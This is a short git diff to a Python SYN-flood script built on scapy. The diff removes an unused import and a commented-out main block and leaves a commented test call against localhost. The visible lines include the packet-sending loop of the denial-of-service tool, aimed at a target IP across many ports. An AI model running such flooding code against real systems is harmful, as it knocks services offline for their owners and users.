@@ -1,4 +1,3 @@
-import random
 # Requires scapy and npcap
 from scapy.all import IP, TCP, send
 from utilities import randInt, randomIP
@@ -40,10 +39,5 @@ def SYN_Flood(targetIP, numPackets, ports=[range(3, 65535)]):
             send(IP_Packet/TCP_Packet, verbose=0)
             print(f"Sent packet to {targetIP}:{port}")
 
-"""
-def main():
-    SYN_Flood('127.0.0.1', 3, [123, 456])
 
-if __name__ == "__main__":
-    main()
-"""
+#SYN_Flood('127.0.0.1', 3, [123, 456])
